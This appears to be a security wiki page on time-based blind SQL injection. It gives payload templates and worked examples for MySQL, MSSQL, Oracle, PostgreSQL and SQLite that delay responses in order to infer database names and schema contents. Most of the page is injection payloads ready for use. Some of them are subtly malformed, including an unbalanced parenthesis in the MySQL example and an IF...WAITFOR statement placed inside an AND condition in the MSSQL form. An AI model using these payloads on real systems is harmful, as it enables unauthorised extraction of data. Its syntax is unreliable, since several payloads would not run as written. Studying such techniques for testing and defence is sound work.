# Time Based

## Theory

Time-based SQL injection is a technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.

## Practice

The process is relatively the same as [Boolean Based](boolean-based.md) injection. All you have to do is modify the payloads to force the database to wait.

{% tabs %}
{% tab title="MySQL" %}
A time-based SQLi payload in MySQL will look like this

```bash
1' AND IF (YOUR-CONDITION-HERE, sleep(3),'false')-- -
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LENGTH(database()))=1-- -

#Time Based  
1' AND IF (SELECT LENGTH(database()))=1, sleep(3),'false')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
A time-based SQLi payload in MSSQL will look like this

```bash
1' AND IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'-- 
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LEN(DB_NAME()))=1--

#Time Based  
1' AND IF ((SELECT LEN(DB_NAME()))=1) WAITFOR DELAY '0:0:10'-- 
```
{% endtab %}

{% tab title="OracleSQL" %}
A time-based SQLi payload in OracleSQL will look like this

```bash
1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LENGTH(global_name) FROM global_name)=1--

#Time Based  
1' AND CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
```
{% endtab %}

{% tab title="PostgreSQL" %}
A time-based SQLi payload in PostgreSQL will look like this

```bash
1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT LENGTH(current_database()))=1--

#Time Based  
1' AND CASE WHEN ((SELECT LENGTH(current_database()))=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
{% endtab %}

{% tab title="SQLite" %}
A time-based SQLi payload in SQLite will look like this

```bash
1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 1 ELSE UPPER(HEX(RANDOMBLOB(1000000000/2))) END--
```

Examples:

```bash
#Boolean Based  
1' AND (SELECT HEX(SUBSTR(sql,1,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('C')--

#Time Based  
1' AND CASE WHEN ((SELECT HEX(SUBSTR(sql,1,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('C')) THEN 1 ELSE UPPER(HEX(RANDOMBLOB(1000000000/2))) END--
```
{% endtab %}
{% endtabs %}
